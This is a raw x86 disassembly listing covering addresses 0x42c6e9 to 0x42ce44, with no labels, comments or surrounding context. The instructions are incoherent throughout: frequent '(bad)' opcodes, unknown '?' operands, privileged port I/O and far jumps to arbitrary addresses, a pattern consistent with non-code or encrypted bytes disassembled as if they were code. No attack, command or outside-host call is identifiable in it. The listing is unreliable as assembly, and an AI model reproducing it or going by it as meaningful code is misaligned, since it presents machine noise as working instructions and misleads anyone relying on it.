  42c6e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c6ea:	das    
  42c6eb:	fs push 0x3ce80eb2
  42c6f1:	sbb    ebp,ecx
  42c6f3:	(bad)  
  42c6f4:	fsub   st(5),st
  42c6f6:	xor    dl,BYTE PTR [eax]
  42c6f8:	cdq    
  42c6f9:	mov    WORD PTR ds:0x41449033,cs
  42c6ff:	mov    ecx,0x80101b91
  42c704:	mov    eax,0x904393db
  42c709:	retf   0x4b69
  42c70c:	ins    BYTE PTR es:[edi],dx
  42c70d:	jmp    FWORD PTR [edx+0x7b]
  42c710:	je     0x42c70d
  42c712:	clc    
  42c713:	adc    al,0xc8
  42c715:	sub    edx,DWORD PTR [eax+0x0]
  42c718:	adc    eax,0x51b5edc
  42c71d:	pusha  
  42c71e:	or     al,0xc
  42c720:	pusha  
  42c721:	mov    gs,WORD PTR [ebx]
  42c723:	and    al,0xa4
  42c725:	dec    ebx
  42c726:	addr16 push ebx
  42c728:	mov    ah,0xb7
  42c72a:	gs dec ebx
  42c72c:	lods   al,BYTE PTR ds:[esi]
  42c72d:	add    ecx,eax
  42c72f:	sbb    BYTE PTR [esi+0x1b],dh
  42c732:	adc    BYTE PTR [edi-0x791c009c],al
  42c738:	loopne 0x42c6fa
  42c73a:	adc    al,0x7f
  42c73c:	mov    ah,0x6a
  42c73f:	jae    0x42c7b5
  42c741:	daa    
  42c742:	xchg   ebp,eax
  42c743:	stc    
  42c744:	(bad)  
  42c745:	scas   eax,DWORD PTR es:[edi]
  42c746:	dec    edx
  42c747:	test   esi,eax
  42c749:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c74a:	outs   dx,BYTE PTR ds:[esi]
  42c74b:	jg     0x42c74d
  42c74d:	add    BYTE PTR [eax],al
  42c74f:	add    BYTE PTR [eax],al
  42c751:	xor    al,0xff
  42c753:	pop    ss
  42c754:	add    DWORD PTR ds:0x6c43676a,esp
  42c75a:	das    
  42c75b:	inc    eax
  42c75c:	push   edx
  42c75d:	inc    edi
  42c75e:	sahf   
  42c75f:	and    si,WORD PTR [eax+ebx*1]
  42c763:	adc    BYTE PTR [eax],al
  42c765:	push   edi
  42c766:	xchg   edi,eax
  42c767:	cs pop esp
  42c769:	xchg   ebx,eax
  42c76a:	sbb    edx,DWORD PTR [eax]
  42c76c:	(bad)  
  42c76d:	jg     0x42c78a
  42c76f:	adc    al,ch
  42c771:	mov    dl,0x5c
  42c773:	idiv   dl
  42c775:	sbb    ecx,DWORD PTR [edx+ebp*2-0x11]
  42c779:	js     0x42c72d
  42c77b:	xor    al,0xf6
  42c77d:	pop    edx
  42c77e:	sub    eax,0xa60eea61
  42c783:	(bad)  [edi]
  42c785:	sbb    DWORD PTR [esi-0x6939082f],ebp
  42c78b:	(bad)  [ebx-0x70]
  42c78e:	aas    
  42c78f:	jb     0x42c7b1
  42c791:	inc    eax
  42c792:	mov    bl,0xf5
  42c794:	add    eax,eax
  42c796:	aas    
  42c797:	or     ah,BYTE PTR [eax]
  42c799:	les    ebx,FWORD PTR [edx]
  42c79b:	xchg   esi,eax
  42c79c:	rcr    BYTE PTR [edx],0x2d
  42c79f:	jae    0x42c793
  42c7a1:	mov    ds:0x1d50abb9,eax
  42c7a6:	jle    0x42c7b9
  42c7a8:	fs clc 
  42c7aa:	aad    0x3b
  42c7ac:	jmp    0x7073feab
  42c7b1:	xchg   edx,eax
  42c7b2:	cmp    ebp,ecx
  42c7b4:	fadd   QWORD PTR [eax]
  42c7b6:	add    BYTE PTR [eax],al
  42c7b8:	add    BYTE PTR [eax],al
  42c7ba:	in     eax,dx
  42c7bb:	fistp  QWORD PTR [ebx+ebp*4]
  42c7be:	stc    
  42c7bf:	mov    dl,0xf5
  42c7c1:	add    ecx,DWORD PTR ds:0x9163d236
  42c7c7:	mov    dl,0xf5
  42c7c9:	ror    edi,0x2c
  42c7cc:	mov    dh,0x3a
  42c7ce:	cmp    eax,0x5ac1612b
  42c7d3:	mov    WORD PTR [eax+0x388eac7c],?
  42c7d9:	dec    edi
  42c7da:	pop    ss
  42c7db:	push   ds
  42c7dc:	xchg   DWORD PTR [ecx+ebx*8],esi
  42c7df:	and    DWORD PTR [edx+0x4e],0xffffff9c
  42c7e3:	jb     0x42c7a2
  42c7e5:	ficomp WORD PTR [ecx+0x4f7ec52c]
  42c7eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c7ec:	call   0xfa71cc75
  42c7f1:	outs   dx,BYTE PTR ds:[esi]
  42c7f2:	lea    esi,[edi]
  42c7f4:	out    0x7c,al
  42c7f6:	dec    edi
  42c7f7:	sbb    ecx,DWORD PTR [edi]
  42c7f9:	out    dx,al
  42c7fa:	gs sub esp,ebp
  42c7fd:	bound  edx,QWORD PTR [ecx+0x15]
  42c800:	push   ss
  42c801:	jb     0x42c81e
  42c803:	adc    al,0xeb
  42c805:	cwde   
  42c806:	push   0xd9a92029
  42c80b:	stc    
  42c80c:	iret   
  42c80d:	xor    al,0xc5
  42c80f:	pop    ss
  42c810:	ds pop ds
  42c812:	loope  0x42c7a8
  42c814:	adc    BYTE PTR [edx+0x2a],dh
  42c817:	aas    
  42c818:	inc    edx
  42c819:	jne    0x42c7f5
  42c81b:	sbb    bh,BYTE PTR [edi+ebp*2+0x0]
  42c822:	add    BYTE PTR [eax],bh
  42c824:	sub    DWORD PTR [eax+0x63219e59],ebx
  42c82a:	add    eax,0x5fea8695
  42c82f:	aad    0xb2
  42c831:	popa   
  42c832:	in     eax,dx
  42c833:	or     al,0x18
  42c835:	sbb    ebx,DWORD PTR [eax]
  42c837:	fnstsw WORD PTR [ebp+0x44]
  42c83a:	rol    DWORD PTR [esi-0x34d9687c],cl
  42c840:	loope  0x42c7cc
  42c842:	jmp    0x121ffbda
  42c847:	sub    DWORD PTR [ebx],esp
  42c849:	in     al,dx
  42c84a:	push   ds
  42c84b:	and    esi,DWORD PTR [ebx-0x6b31f09]
  42c851:	neg    BYTE PTR [edx-0x3e]
  42c854:	sub    ah,ch
  42c856:	mov    ebx,0x304c88d3
  42c85b:	int3   
  42c85c:	xchg   BYTE PTR [edi-0x44e7edfb],dl
  42c862:	in     al,0x93
  42c864:	mov    dl,0x44
  42c866:	jb     0x42c80d
  42c868:	adc    esi,DWORD PTR [edx-0x6cd75022]
  42c86e:	test   eax,0x5c99e001
  42c873:	aam    0x24
  42c875:	in     al,dx
  42c876:	add    BYTE PTR [esi+0xe],dl
  42c879:	push   ecx
  42c87a:	dec    edi
  42c87b:	imul   ebp,DWORD PTR [edi-0x558a1395],0x13239092
  42c885:	jmp    0x42c8f4
  42c88a:	add    BYTE PTR [eax],al
  42c88c:	pop    esp
  42c88d:	jns    0x42c8eb
  42c88f:	push   eax
  42c890:	loop   0x42c8f6
  42c892:	hlt    
  42c893:	jmp    0x8d517f5a
  42c898:	lods   al,BYTE PTR ds:[esi]
  42c899:	jle    0x42c87f
  42c89b:	call   DWORD PTR [esi]
  42c89d:	mov    ?,WORD PTR [edx+0x74af2905]
  42c8a3:	add    BYTE PTR [ecx+0x3f600313],cl
  42c8a9:	outs   dx,DWORD PTR ds:[esi]
  42c8aa:	push   cs
  42c8ab:	sub    DWORD PTR [ebp+0x2a],0x46
  42c8af:	leave  
  42c8b0:	push   0xffffff85
  42c8b2:	pop    ebx
  42c8b3:	push   ebp
  42c8b4:	dec    edi
  42c8b5:	jl     0x42c92b
  42c8b7:	or     al,0x34
  42c8b9:	cmp    BYTE PTR [ebx],0xdb
  42c8bc:	sbb    BYTE PTR ds:0xc1b6575d,0x6e
  42c8c3:	push   ss
  42c8c4:	cmp    DWORD PTR [edi-0x563a3b95],ebp
  42c8ca:	aas    
  42c8cb:	and    al,0xd9
  42c8cd:	mov    BYTE PTR [ecx+0x59],dh
  42c8d0:	xor    DWORD PTR [ecx-0x58590018],0xa29f85fb
  42c8da:	or     BYTE PTR [ebx+0x3afecaed],cl
  42c8e0:	ins    BYTE PTR es:[edi],dx
  42c8e1:	and    edx,DWORD PTR [ecx-0x3b]
  42c8e4:	or     DWORD PTR [ebp+0x3f],edi
  42c8e7:	(bad)  
  42c8e8:	mov    esp,0xa9400072
  42c8ed:	das    
  42c8ee:	ror    BYTE PTR [eax+eax*1],1
  42c8f1:	add    BYTE PTR [eax],al
  42c8f3:	add    BYTE PTR [eax],al
  42c8f5:	and    ah,BYTE PTR [ebp-0xc]
  42c8f8:	sbb    BYTE PTR [eax+0x43faf50a],dl
  42c8fe:	sbb    edx,DWORD PTR [ebp+0x5a]
  42c901:	frstor [ebp+0x5cd956d0]
  42c907:	aas    
  42c908:	xchg   DWORD PTR [ebx+ecx*8+0x3f],edi
  42c90c:	test   DWORD PTR [ecx-0x21],ebx
  42c90f:	jecxz  0x42c961
  42c911:	mov    ds:0x90c7bb6d,eax
  42c916:	sbb    edx,DWORD PTR [eax]
  42c918:	call   0xfb380940
  42c91d:	cmp    ebp,DWORD PTR [ecx+0x67]
  42c920:	inc    esp
  42c921:	cmp    al,0xcc
  42c923:	dec    eax
  42c924:	add    BYTE PTR [edx+0x6b6dc81a],ch
  42c92a:	sbb    edx,DWORD PTR [eax]
  42c92c:	test   DWORD PTR [eax+0x1f],edx
  42c92f:	in     al,dx
  42c930:	sub    eax,0x87158550
  42c935:	mov    ebp,0xd8b93f87
  42c93a:	sbb    edx,DWORD PTR [eax]
  42c93c:	add    al,bh
  42c93e:	imul   esi,esp,0x26a4fffa
  42c944:	cld    
  42c945:	or     dl,ah
  42c947:	(bad)  
  42c948:	enter  0xe0e0,0xf4
  42c94c:	test   ebx,edx
  42c94e:	inc    esp
  42c94f:	stos   DWORD PTR es:[edi],eax
  42c950:	mov    esi,0x50c3a445
  42c955:	inc    ebx
  42c956:	popa   
  42c957:	pop    ebp
  42c958:	data16 add BYTE PTR [eax],al
  42c95b:	add    BYTE PTR [eax],al
  42c95d:	add    BYTE PTR [esp+eiz*2+0x41],dh
  42c961:	xchg   ecx,ecx
  42c963:	xor    eax,0x6bf5310
  42c968:	jo     0x42c97c
  42c96a:	push   eax
  42c96b:	sbb    edx,DWORD PTR [ecx+0x3e8e9cc3]
  42c971:	cld    
  42c972:	cmp    dh,BYTE PTR [ecx]
  42c974:	pop    ebx
  42c975:	call   0xe6357ba5
  42c97a:	call   0xf99f:0x817fc63d
  42c981:	xor    DWORD PTR [eax+0x1d],edx
  42c984:	sti    
  42c985:	js     0x42c95b
  42c987:	es adc ecx,eax
  42c98a:	mov    dh,BYTE PTR [ecx-0x48]
  42c98d:	push   esp
  42c98e:	ret    0xa481
  42c991:	pinsrw mm0,eax,0x35
  42c995:	add    al,0xdf
  42c997:	out    dx,al
  42c998:	loope  0x42ca12
  42c99a:	dec    ecx
  42c99b:	sbb    dh,BYTE PTR [ecx]
  42c99d:	hlt    
  42c99e:	dec    edx
  42c99f:	sub    DWORD PTR [esi+0x3],eax
  42c9a2:	jmp    0x42c92c
  42c9a4:	and    BYTE PTR [ebx-0x279f8102],bh
  42c9aa:	mov    dh,0x16
  42c9ac:	sar    BYTE PTR [esi+0x58],cl
  42c9af:	sahf   
  42c9b0:	int3   
  42c9b1:	pop    ecx
  42c9b2:	ins    BYTE PTR es:[edi],dx
  42c9b3:	or     DWORD PTR [edx+0x3f],0x3c
  42c9b7:	xor    BYTE PTR [edi+ecx*1-0x4c],0xc0
  42c9bc:	mov    ch,0x3
  42c9be:	(bad)  
  42c9bf:	out    dx,al
  42c9c0:	icebp  
  42c9c1:	jbe    0x42c9c3
  42c9c3:	add    BYTE PTR [eax],al
  42c9c5:	add    BYTE PTR [eax],al
  42c9c7:	pop    esp
  42c9c8:	push   es
  42c9c9:	rcr    BYTE PTR [edi],1
  42c9cb:	imul   DWORD PTR [ebp+0x4a703bf]
  42c9d1:	rcr    BYTE PTR [ebp+0x49],0x1a
  42c9d5:	pop    eax
  42c9d6:	jmp    0xc171f2c5
  42c9db:	pop    esi
  42c9dc:	sbb    esi,esi
  42c9de:	outs   dx,DWORD PTR ds:[esi]
  42c9df:	mov    ?,WORD PTR [ebx-0x7f]
  42c9e2:	add    BYTE PTR [edi-0xe],bh
  42c9e5:	cmp    BYTE PTR [edx+0x77],bl
  42c9e8:	mov    bh,BYTE PTR [eax]
  42c9ea:	pop    edx
  42c9eb:	outs   dx,BYTE PTR ds:[esi]
  42c9ec:	mov    bh,BYTE PTR [eax]
  42c9ee:	sub    DWORD PTR [ebx+0x424e88cd],0xba620e81
  42c9f8:	xlat   BYTE PTR ds:[ebx]
  42c9f9:	(bad)  
  42c9fa:	bound  esp,QWORD PTR [ebx-0x7ff2b4c7]
  42ca00:	jmp    0xe90f:0x590fee0b
  42ca07:	xchg   ebx,eax
  42ca08:	xor    eax,0x1aa0055b
  42ca0d:	mov    ebx,eax
  42ca0f:	ins    BYTE PTR es:[edi],dx
  42ca10:	sub    eax,0x3464a993
  42ca15:	mov    cl,0xe9
  42ca17:	xchg   ebx,eax
  42ca18:	mov    dl,0x97
  42ca1a:	lahf   
  42ca1b:	cmp    ebp,DWORD PTR [esp+ebp*8-0x5a]
  42ca1f:	ins    BYTE PTR es:[edi],dx
  42ca20:	aaa    
  42ca21:	inc    ebx
  42ca22:	lds    ebx,FWORD PTR [ebx-0x789f28d1]
  42ca28:	into   
  42ca29:	or     al,BYTE PTR [ecx+0x0]
  42ca2f:	add    dh,dh
  42ca31:	sub    ebp,esp
  42ca33:	xchg   BYTE PTR [eax-0x571ecd65],bh
  42ca39:	pop    ss
  42ca3a:	cwde   
  42ca3b:	pushf  
  42ca3c:	test   al,0xf9
  42ca3e:	imul   BYTE PTR [ecx+0x6dec2b8f]
  42ca44:	push   ebx
  42ca45:	lahf   
  42ca46:	pop    ss
  42ca47:	jb     0x42ca8e
  42ca49:	adc    bh,al
  42ca4b:	inc    esi
  42ca4c:	in     al,dx
  42ca4d:	sub    al,0x98
  42ca4f:	pop    edx
  42ca50:	js     0x42ca62
  42ca52:	xchg   edi,eax
  42ca53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ca54:	xchg   edi,eax
  42ca55:	rcl    BYTE PTR [ebp-0x6a317033],cl
  42ca5b:	mov    ebp,0x8d95da87
  42ca60:	jg     0x42ca38
  42ca62:	xchg   ecx,eax
  42ca63:	pop    ds
  42ca64:	fcom   QWORD PTR [bx+0x7b2a]
  42ca69:	int3   
  42ca6a:	popa   
  42ca6b:	out    dx,eax
  42ca6c:	push   ebx
  42ca6d:	jmp    0x52:0x272fe84c
  42ca74:	mov    ds:0x2fc09322,al
  42ca79:	mov    edx,0x84060cf3
  42ca7e:	out    0x15,eax
  42ca80:	ror    DWORD PTR gs:[esi+0x0],0x24
  42ca85:	out    dx,al
  42ca86:	pop    edi
  42ca87:	xor    ah,bh
  42ca89:	xor    BYTE PTR [edx],0x20
  42ca8c:	push   ecx
  42ca8d:	mov    BYTE PTR [ebx],bl
  42ca8f:	dec    DWORD PTR [esi+0x39]
  42ca92:	lods   al,BYTE PTR ds:[esi]
  42ca93:	jne    0x42ca95
  42ca95:	add    BYTE PTR [eax],al
  42ca97:	add    BYTE PTR [eax],al
  42ca99:	inc    esi
  42ca9a:	cwde   
  42ca9b:	out    0x57,eax
  42ca9d:	cld    
  42ca9e:	xor    BYTE PTR [edx],0x28
  42caa1:	push   ecx
  42caa2:	pop    ebx
  42caa3:	sbb    eax,0xac3a2eff
  42caa8:	je     0x42cb04
  42caaa:	adc    al,0x60
  42caac:	and    al,0x55
  42caae:	cmp    BYTE PTR [eax+0x24],al
  42cab1:	dec    ebp
  42cab2:	cmp    BYTE PTR [eax+0x24],bl
  42cab5:	dec    ecx
  42cab6:	sbb    ebx,DWORD PTR [eax]
  42cab8:	sti    
  42cab9:	push   cs
  42caba:	adc    edx,DWORD PTR [edx+0x3282bcd8]
  42cac0:	and    BYTE PTR [ecx],dl
  42cac2:	xlat   BYTE PTR ds:[ebx]
  42cac3:	sbb    edi,edi
  42cac5:	scas   al,BYTE PTR es:[edi]
  42cac6:	inc    ecx
  42cac7:	pop    eax
  42cac8:	and    al,0x15
  42caca:	sbb    eax,eax
  42cacc:	stc    
  42cacd:	outs   dx,BYTE PTR ds:[esi]
  42cace:	adc    edx,DWORD PTR [edx+0x49713ec3]
  42cad4:	pop    ebx
  42cad5:	push   0xfffffffa
  42cad7:	das    
  42cad8:	ret    
  42cad9:	push   0x22
  42cadb:	cmp    BYTE PTR [ebx+0x4],dl
  42cade:	jmp    0x3649bd76
  42cae3:	pusha  
  42cae4:	and    al,0x89
  42cae6:	push   ss
  42cae7:	call   0x955679ea
  42caec:	call   0x24756d31
  42caf1:	nop
  42caf2:	xchg   esi,eax
  42caf3:	enter  0x8d74,0x6b
  42caf7:	popf   
  42caf8:	int3   
  42caf9:	test   al,0xe2
  42cafb:	int3   
  42cafc:	cli    
  42cafd:	add    BYTE PTR [eax],al
  42caff:	add    BYTE PTR [eax],al
  42cb01:	add    BYTE PTR [edi-0x5800563f],ch
  42cb07:	sbb    BYTE PTR ds:0x34450dd7,al
  42cb0d:	sbb    BYTE PTR [ecx],cl
  42cb0f:	ins    DWORD PTR es:[edi],dx
  42cb10:	sbb    BYTE PTR ss:[eax+0x2f],bh
  42cb14:	retf   
  42cb15:	cli    
  42cb16:	xchg   DWORD PTR [eax+0x3d140acf],ebx
  42cb1c:	adc    BYTE PTR [eax],al
  42cb1e:	nop
  42cb1f:	sahf   
  42cb20:	and    esp,DWORD PTR [esp+ecx*4]
  42cb23:	mov    al,ds:0x6143e7be
  42cb28:	icebp  
  42cb29:	cli    
  42cb2a:	or     eax,eax
  42cb2c:	ss sbb al,0xb
  42cb2f:	fs cwde 
  42cb31:	pop    ebx
  42cb32:	je     0x42cb37
  42cb34:	fwait
  42cb35:	push   ebx
  42cb36:	ins    BYTE PTR es:[edi],dx
  42cb37:	out    dx,eax
  42cb38:	call   0x6c5b:0x9b0b7443
  42cb3f:	addr16 clc 
  42cb41:	lds    eax,FWORD PTR [ebx+0x5083f0a4]
  42cb47:	or     eax,0x1b907f94
  42cb4c:	adc    BYTE PTR [edx+0x8],dl
  42cb4f:	lock xor edx,DWORD PTR [edi]
  42cb52:	nop    DWORD PTR [esi+ecx*1+0x50]
  42cb57:	sbb    edi,DWORD PTR [edi+0x4b]
  42cb5a:	mov    ah,0xb3
  42cb5c:	and    ecx,DWORD PTR [ecx-0x78cd48b4]
  42cb62:	jecxz  0x42cae7
  42cb64:	and    eax,DWORD PTR ds:0x0
  42cb6a:	add    BYTE PTR [eax+0x15f79d1b],dl
  42cb70:	aad    0x43
  42cb72:	pop    ebx
  42cb73:	or     esi,DWORD PTR [ebx-0x7e8fd87f]
  42cb79:	pusha  
  42cb7a:	shr    BYTE PTR [edi-0x6ffc9db2],cl
  42cb80:	cmp    DWORD PTR [edx-0x737d8fd9],esp
  42cb86:	mov    ds,esp
  42cb88:	sbb    ah,BYTE PTR [eax+0x7a25aaf4]
  42cb8e:	ret    
  42cb8f:	and    edi,DWORD PTR [esi-0x31b46f7d]
  42cb95:	add    esp,ebp
  42cb97:	call   0xc46c14b
  42cb9c:	repnz dec ecx
  42cb9e:	or     cl,dl
  42cba0:	in     al,dx
  42cba1:	xor    DWORD PTR [eax],ebp
  42cba3:	mov    ds:0x1d3a3bb3,eax
  42cba8:	jbe    0x42cbbb
  42cbaa:	xor    BYTE PTR [eax-0x40],bh
  42cbad:	cli    
  42cbae:	add    edx,DWORD PTR [eax+0x5a879e39]
  42cbb4:	lahf   
  42cbb5:	mov    bh,0x8e
  42cbb7:	ror    esi,cl
  42cbb9:	in     al,0x8c
  42cbbb:	mov    ebx,0xff87d9ce
  42cbc0:	popf   
  42cbc1:	out    0xe0,al
  42cbc3:	ret    
  42cbc4:	into   
  42cbc5:	ror    DWORD PTR [ebx+eax*8+0x548ca1ce],0x1a
  42cbcd:	clc    
  42cbce:	fld    QWORD PTR [eax]
  42cbd0:	add    BYTE PTR [eax],al
  42cbd2:	add    BYTE PTR [eax],al
  42cbd4:	sbb    ah,BYTE PTR ds:0x7604bc70
  42cbda:	sbb    DWORD PTR [eax+edi*8],ebp
  42cbdd:	shl    bh,cl
  42cbdf:	loopne 0x42cbeb
  42cbe1:	aaa    
  42cbe2:	mov    dl,0x27
  42cbe4:	cwde   
  42cbe5:	sbb    dh,BYTE PTR [eax]
  42cbe7:	fdiv   st(2),st
  42cbe9:	and    al,0x60
  42cbeb:	lds    ecx,FWORD PTR [edx-0x7c]
  42cbee:	mov    bh,BYTE PTR [edi+eiz*2]
  42cbf1:	out    dx,al
  42cbf2:	push   cs
  42cbf3:	add    eax,0xd5faa3d5
  42cbf8:	pushf  
  42cbf9:	jg     0x42cc3f
  42cbfb:	mov    esi,0xd132a91c
  42cc00:	adc    al,0xf
  42cc02:	cwde   
  42cc03:	sbb    BYTE PTR [edi],dl
  42cc05:	sub    BYTE PTR [esi-0x1e],ah
  42cc08:	jle    0x42cc33
  42cc0a:	add    dl,BYTE PTR [ebp+0x720ee4a5]
  42cc10:	les    ebp,FWORD PTR ds:0xd49776ec
  42cc16:	into   
  42cc17:	add    ah,BYTE PTR [edi]
  42cc19:	sub    eax,0x274ad1dd
  42cc1e:	in     al,dx
  42cc1f:	ficom  WORD PTR [esi]
  42cc21:	xor    BYTE PTR [edx],0x1
  42cc24:	or     eax,0x55aff6ec
  42cc29:	sub    esp,ebp
  42cc2b:	jb     0x42cbd4
  42cc2d:	into   
  42cc2e:	ss cli 
  42cc30:	and    al,0x2d
  42cc32:	xlat   BYTE PTR ds:[ebx]
  42cc33:	popa   
  42cc34:	lahf   
  42cc35:	into   
  42cc36:	(bad)  
  42cc37:	pop    edi
  42cc38:	add    BYTE PTR [eax],al
  42cc3a:	add    BYTE PTR [eax],al
  42cc3c:	add    BYTE PTR [edi-0x288ffd32],bl
  42cc42:	into   
  42cc43:	push   es
  42cc44:	jo     0x42cbcd
  42cc46:	into   
  42cc47:	or     al,BYTE PTR [ecx-0x711449fc]
  42cc4d:	pcmpgtb mm4,QWORD PTR [ebx-0x2a]
  42cc51:	cmp    al,0xbe
  42cc53:	jmp    0x42cc4a
  42cc55:	outs   dx,DWORD PTR ds:[esi]
  42cc56:	(bad)  
  42cc57:	xchg   edi,eax
  42cc58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cc59:	pop    eax
  42cc5a:	jge    0x42cc52
  42cc5c:	sahf   
  42cc5d:	xchg   esp,eax
  42cc5e:	and    ebp,esp
  42cc60:	jb     0x42cca5
  42cc62:	sub    eax,0xc26a51dd
  42cc67:	jmp    0x42ccbf
  42cc69:	pop    ss
  42cc6a:	fs (bad) 
  42cc6c:	clc    
  42cc6d:	push   es
  42cc6e:	js     0x42cca2
  42cc70:	add    cl,cl
  42cc72:	pop    ss
  42cc73:	lahf   
  42cc74:	adc    DWORD PTR [esi+0x6cf09512],esp
  42cc7a:	or     DWORD PTR [ebx-0x29],esp
  42cc7d:	push   edx
  42cc7e:	lods   eax,DWORD PTR ds:[esi]
  42cc7f:	mov    ebx,0x32734401
  42cc84:	adc    BYTE PTR [ecx-0x5901026e],ah
  42cc8a:	xor    eax,0xe4e75fad
  42cc8f:	inc    ebx
  42cc90:	cmp    DWORD PTR [ebp+0x1b],0xffffffaa
  42cc94:	or     BYTE PTR [ecx-0x5c307d2],bh
  42cc9a:	fadd   QWORD PTR [eax-0x75]
  42cc9d:	nop
  42cc9e:	mov    esi,0x57c3
  42cca3:	add    BYTE PTR [eax],al
  42cca5:	add    BYTE PTR [ebx+eax*4],al
  42cca8:	xor    ah,BYTE PTR [eax]
  42ccaa:	add    BYTE PTR [ebx+0x72f02832],ah
  42ccb0:	xor    ah,BYTE PTR [eax]
  42ccb2:	push   ecx
  42ccb3:	mov    dl,0xe6
  42ccb5:	call   DWORD PTR [esi+0x3a]
  42ccb8:	lods   al,BYTE PTR ds:[esi]
  42ccb9:	paddsw mm6,QWORD PTR [ebx+0xd]
  42ccbd:	add    BYTE PTR [ecx-0x67],ch
  42ccc0:	add    cl,BYTE PTR [ebp+0x5526daad]
  42ccc6:	mov    DWORD PTR [ebx],eax
  42ccc8:	add    ebx,DWORD PTR [edi+edi*1+0x6f]
  42cccc:	push   cs
  42cccd:	sub    ebp,0xffffffc1
  42ccd0:	mul    BYTE PTR [ecx-0x80]
  42ccd3:	add    al,0xe9
  42ccd5:	lea    ecx,[ebp-0x4146f926]
  42ccdb:	scas   al,BYTE PTR es:[edi]
  42ccdc:	push   cs
  42ccdd:	add    BYTE PTR [eax+0x1130327a],dh
  42cce3:	loope  0x42ccc9
  42cce5:	push   DWORD PTR [esi+0x37]
  42cce8:	cld    
  42cce9:	push   0xffffff91
  42cceb:	xor    eax,0xc9902460
  42ccf0:	cdq    
  42ccf1:	jae    0x42cc9f
  42ccf3:	mov    ecx,0x1be6854d
  42ccf8:	xchg   esp,eax
  42ccf9:	fst    QWORD PTR [eax+0x5c871019]
  42ccff:	mov    ch,0xea
  42cd01:	cs ret 0xd38f
  42cd05:	repnz lds edx,FWORD PTR [ebp+0xaa0]
  42cd0c:	add    BYTE PTR [eax],al
  42cd0e:	add    BYTE PTR ds:0x900012e9,cl
  42cd14:	mov    ss,WORD PTR [esi]
  42cd16:	xor    ecx,DWORD PTR [edx]
  42cd18:	rcr    BYTE PTR [edx-0x66fb8bb5],1
  42cd1e:	fldcw  WORD PTR [ebx+0x29]
  42cd21:	inc    ecx
  42cd22:	inc    edx
  42cd23:	or     eax,0xa086e82b
  42cd28:	mov    ecx,ds
  42cd2a:	je     0x42cd24
  42cd2c:	test   esi,esp
  42cd2e:	cli    
  42cd2f:	cld    
  42cd30:	mov    bh,0x1e
  42cd32:	(bad)  
  42cd33:	ror    DWORD PTR [edi],cl
  42cd35:	and    bl,bh
  42cd37:	popf   
  42cd38:	ja     0x42cd1e
  42cd3a:	aas    
  42cd3b:	nop
  42cd3c:	mov    ebx,ss
  42cd3e:	or     ecx,DWORD PTR ds:0xb4d474c
  42cd44:	shl    BYTE PTR [esi],1
  42cd46:	xor    BYTE PTR [ecx],ah
  42cd48:	or     ebx,DWORD PTR [ebx+0x36e817fe]
  42cd4e:	adc    edi,DWORD PTR [edx+0x67ff2ab3]
  42cd54:	or     eax,0xbe5636f8
  42cd59:	fadd   QWORD PTR [esi-0x7bc4105c]
  42cd5f:	pop    ecx
  42cd60:	adc    DWORD PTR [edi+0x100b9097],edx
  42cd66:	data16 js 0x42cd17
  42cd69:	and    eax,0x19b2548d
  42cd6e:	sbb    BYTE PTR [eax+0x2f],ah
  42cd71:	mov    ds:0x27,al
  42cd76:	add    BYTE PTR [eax],al
  42cd78:	mov    al,0x2f
  42cd7a:	mov    dl,0x27
  42cd7c:	lods   al,BYTE PTR ds:[esi]
  42cd7d:	or     dh,BYTE PTR [ecx+0x7b21eaf0]
  42cd83:	ret    
  42cd84:	pop    esp
  42cd85:	jl     0x42cde7
  42cd87:	dec    edi
  42cd88:	mov    ah,0xbe
  42cd8a:	dec    ebp
  42cd8b:	(bad)
  42cd8e:	cmp    eax,0x7a0be712
  42cd93:	add    edx,DWORD PTR [eax+0x744f5fb2]
  42cd99:	leave  
  42cd9a:	jo     0x42cde3
  42cd9c:	ins    BYTE PTR es:[edi],dx
  42cd9d:	loop   0x42cd5d
  42cd9f:	add    ah,BYTE PTR [ebx]
  42cda1:	stos   DWORD PTR es:[edi],eax
  42cda2:	rol    BYTE PTR [edx],0x65
  42cda5:	xor    dl,al
  42cda7:	or     al,0x90
  42cda9:	test   al,0x4f
  42cdab:	sbb    ch,BYTE PTR [edx+0x518abea5]
  42cdb1:	int    0xba
  42cdb3:	push   0xffffffa8
  42cdb5:	jnp    0x42cd45
  42cdb7:	aad    0x78
  42cdb9:	lea    esi,[ebp+0x2887c7fc]
  42cdbf:	fld    QWORD PTR [esi+edi*2+0x359043cb]
  42cdc6:	mov    dl,0x10
  42cdc8:	push   ss
  42cdc9:	outs   dx,BYTE PTR ds:[esi]
  42cdca:	sbb    ebp,esi
  42cdcc:	in     eax,dx
  42cdcd:	mov    edx,0xcd4828fd
  42cdd2:	test   DWORD PTR [ecx],ebp
  42cdd4:	push   0x98280a2b
  42cdd9:	int    0x8d
  42cddb:	jmp    0x42cddd
  42cddd:	add    BYTE PTR [eax],al
  42cddf:	add    BYTE PTR [eax],al
  42cde1:	mov    edi,0x16dd9d21
  42cde6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cde7:	fcos   
  42cde9:	push   cs
  42cdea:	sahf   
  42cdeb:	sar    ebx,1
  42cded:	ss mov esp,0x1946620e
  42cdf3:	jae    0x42ce72
  42cdf5:	in     eax,dx
  42cdf6:	sbb    ebx,DWORD PTR [eax+0x326d173c]
  42cdfc:	sbb    DWORD PTR [ecx],ecx
  42cdfe:	push   ds
  42cdff:	test   DWORD PTR [eax+0x62ec1c00],0xbde535c4
  42ce09:	fld    QWORD PTR [ebx+0x43fb1797]
  42ce0f:	psubsw mm2,QWORD PTR [ebx-0x12c933f6]
  42ce16:	sbb    ebx,DWORD PTR [eax-0x8f6e5c9]
  42ce1c:	loop   0x42cdcd
  42ce1e:	sbb    ebp,esp
  42ce20:	fs pusha 
  42ce22:	(bad)  
  42ce23:	cs add ebx,edi
  42ce26:	and    ch,ah
  42ce28:	push   es
  42ce29:	sbb    ah,BYTE PTR [eax+0x4c]
  42ce2c:	lahf   
  42ce2d:	pop    esi
  42ce2e:	mov    DWORD PTR [edi+0x3e61702d],ecx
  42ce34:	cwde   
  42ce35:	rol    BYTE PTR [ebp-0x29288fbc],0xfe
  42ce3c:	xor    eax,0xf932840f
  42ce41:	sbb    al,BYTE PTR [ebp+0xf]
  42ce44:	jmp    0x42ce49
